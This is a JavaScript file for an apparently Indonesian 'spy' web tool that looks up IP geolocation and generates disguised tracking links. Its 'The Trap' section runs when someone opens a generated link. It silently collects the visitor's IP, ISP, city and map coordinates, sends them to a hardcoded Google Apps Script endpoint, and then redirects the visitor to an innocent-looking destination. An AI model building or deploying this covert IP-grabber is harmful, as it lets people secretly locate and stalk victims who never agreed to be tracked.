document.addEventListener('DOMContentLoaded', function () {
    const myIpBadge = document.getElementById('my-ip-badge');
    const loading = document.getElementById('loading');
    const resultArea = document.getElementById('result-area');
    const geoResult = document.getElementById('geo-result');
    const geoData = document.getElementById('geo-data');
    const logsBody = document.getElementById('logs-body');
    const cloudApiInput = document.getElementById('cloud-api-url');

    // Load saved Cloud API URL (Default to user's provided URL)
    const DEFAULT_CLOUD_URL = 'https://script.google.com/macros/s/AKfycbzqJb0FteRq7SUfHq3KIMYIoGYDfKdm-i12v0O6bHfYDqHy2fjdKCRB0TS_G5GzFBoktg/exec';
    if (!localStorage.getItem('spy_cloud_url')) {
        localStorage.setItem('spy_cloud_url', DEFAULT_CLOUD_URL);
    }
    cloudApiInput.value = localStorage.getItem('spy_cloud_url');

    // 1. Utility: Loading
    function showLoading(show) {
        if (show) loading.classList.remove('d-none');
        else loading.classList.add('d-none');
    }

    // 2. Detect My IP
    async function detectMyIp() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            myIpBadge.innerHTML = `<i class="fas fa-shield-alt me-2 text-primary"></i>${data.ip}`;
            return data.ip;
        } catch (err) {
            myIpBadge.innerHTML = `<i class="fas fa-exclamation-triangle me-2 text-warning"></i>Detection Failed`;
            return null;
        }
    }
    detectMyIp();

    // 3. IP Intelligence APIs (Multi-server Fallback)
    async function fetchIpIntel(ip = '') {
        const query = ip ? `/${ip}` : '';
        
        // Try Server 1: ipapi.co
        try {
            const res = await fetch(`https://ipapi.co${query}/json/`);
            const data = await res.json();
            if (!data.error) return {
                ip: data.ip,
                isp: data.org,
                location: `${data.city}, ${data.country_name}`,
                city: data.city,
                country: data.country_name,
                lat: data.latitude,
                lon: data.longitude,
                timezone: data.timezone
            };
        } catch (e) { console.warn("Server 1 (ipapi.co) failed"); }

        // Try Server 2: geojs.io
        try {
            const res = await fetch(`https://get.geojs.io/v1/ip/geo${query}.json`);
            const data = await res.json();
            return {
                ip: data.ip,
                isp: data.organization_name || data.organization,
                location: `${data.city}, ${data.country}`,
                city: data.city,
                country: data.country,
                lat: data.latitude,
                lon: data.longitude,
                timezone: data.timezone
            };
        } catch (e) { console.warn("Server 2 (geojs.io) failed"); }

        throw new Error("Gagal menghubungi semua server intelijen.");
    }

    // 4. Save to Cloud/Local
    async function saveLog(data, type = 'Manual', targetUrl = 'Manual Search') {
        const cloudUrl = localStorage.getItem('spy_cloud_url');
        const logEntry = {
            ip: data.ip || 'Unknown',
            isp: data.isp || 'Unknown',
            location: data.location || 'Unknown',
            coords: `${data.lat || 0}, ${data.lon || 0}`,
            target: targetUrl,
            type: type
        };

        // Save to LocalStorage
        const localLogs = JSON.parse(localStorage.getItem('spy_logs') || '[]');
        localLogs.unshift({ ...logEntry, timestamp: new Date().toLocaleString('id-ID') });
        localStorage.setItem('spy_logs', JSON.stringify(localLogs.slice(0, 50)));

        // Save to Cloud
        if (cloudUrl && cloudUrl.startsWith('http')) {
            try {
                await fetch(cloudUrl, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(logEntry)
                });
            } catch (e) { console.error("Cloud Save Failed"); }
        }
    }

    // 5. Fetch Logs
    async function loadLogs() {
        const cloudUrl = localStorage.getItem('spy_cloud_url');
        logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-4"><div class="spinner-border spinner-border-sm text-primary"></div> Syncing data...</td></tr>';

        if (cloudUrl && cloudUrl.startsWith('http')) {
            try {
                const res = await fetch(cloudUrl);
                const data = await res.json();
                renderLogs(data);
                return;
            } catch (e) { console.warn("Cloud Fetch Failed, falling back to local"); }
        }
        
        renderLogs(JSON.parse(localStorage.getItem('spy_logs') || '[]'));
    }

    function renderLogs(logs) {
        if (!logs || logs.length === 0) {
            logsBody.innerHTML = '<tr><td colspan="4" class="text-center py-5 text-muted opacity-50">Belum ada aktivitas intelijen.</td></tr>';
            return;
        }
        logsBody.innerHTML = logs.map(log => `
            <tr>
                <td><div class="text-primary small fw-bold">${log.timestamp || 'Just Now'}</div></td>
                <td><strong>${log.ip}</strong><br><span class="text-muted extra-small">${log.isp || '-'}</span></td>
                <td><span class="small">${log.location}</span></td>
                <td><a href="https://www.google.com/maps?q=${log.coords}" target="_blank" class="btn btn-xs btn-outline-primary"><i class="fas fa-map-marker-alt"></i></a></td>
            </tr>
        `).join('');
    }

    // 6. Track Action
    async function performTrack(targetIp) {
        showLoading(true);
        resultArea.innerHTML = '';
        
        try {
            const data = await fetchIpIntel(targetIp);
            showLoading(false);

            resultArea.innerHTML = `
                <div class="result-card border-primary border-opacity-25 animate__animated animate__fadeInUp">
                    <h5 class="fw-bold text-primary mb-4 d-flex align-items-center"><i class="fas fa-user-secret me-2"></i>Intel: ${data.ip}</h5>
                    <div class="row g-3">
                        <div class="col-sm-6"><div class="data-label">LOKASI</div><div class="fs-6 text-white">${data.location}</div></div>
                        <div class="col-sm-6"><div class="data-label">KOORDINAT</div><div class="fs-6 text-white">${data.lat}, ${data.lon}</div></div>
                        <div class="col-sm-6"><div class="data-label">ISP</div><div class="small text-white opacity-75">${data.isp}</div></div>
                        <div class="col-sm-6"><div class="data-label">ZONA WAKTU</div><div class="small text-white opacity-75">${data.timezone || '-'}</div></div>
                    </div>
                    <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-link w-100 text-center mt-3 py-2">BUKA PETA</a>
                </div>`;
            
            saveLog(data, targetIp ? 'Search' : 'Self');
        } catch (e) { 
            showLoading(false); 
            resultArea.innerHTML = `<div class="alert alert-danger">${e.message}</div>`;
        }
    }

    // 7. UI Events
    document.getElementById('btn-track-ip').addEventListener('click', () => performTrack(document.getElementById('ip-to-track').value));
    document.getElementById('btn-track-me').addEventListener('click', () => performTrack(''));
    document.getElementById('logs-tab').addEventListener('click', loadLogs);
    document.getElementById('btn-refresh-logs').addEventListener('click', loadLogs);
    
    document.getElementById('btn-save-api').addEventListener('click', function() {
        localStorage.setItem('spy_cloud_url', cloudApiInput.value.trim());
        this.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => this.innerHTML = '<i class="fas fa-save"></i>', 2000);
    });

    document.getElementById('btn-clear-logs').addEventListener('click', () => {
        if(confirm('Hapus log lokal?')) { localStorage.removeItem('spy_logs'); loadLogs(); }
    });

    // Link Generator
    const btnGenerate = document.getElementById('btn-generate-link');
    const spyUrlResult = document.getElementById('spy-url-result');
    const generatedResult = document.getElementById('generated-result');

    btnGenerate.addEventListener('click', () => {
        const targetUrl = document.getElementById('target-url').value.trim();
        if (!targetUrl.startsWith('http')) return alert('Masukkan URL lengkap!');
        const currentUrl = window.location.href.split('?')[0];
        const spyId = Math.random().toString(36).substring(7);
        spyUrlResult.value = `${currentUrl}?id=${spyId}&redir=${encodeURIComponent(targetUrl)}`;
        generatedResult.classList.remove('d-none');
    });

    document.getElementById('btn-copy-link').addEventListener('click', async function() {
        await navigator.clipboard.writeText(spyUrlResult.value);
        this.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => this.innerHTML = '<i class="fas fa-copy"></i>', 2000);
    });

    // 8. Handle Redirect (The Trap)
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.has('id') && urlParams.has('redir')) {
        const redirTarget = urlParams.get('redir');
        
        // Silent Tracking with fallback
        fetchIpIntel('')
            .then(data => saveLog(data, 'TRAP', redirTarget))
            .finally(() => window.location.href = redirTarget);
    }
});
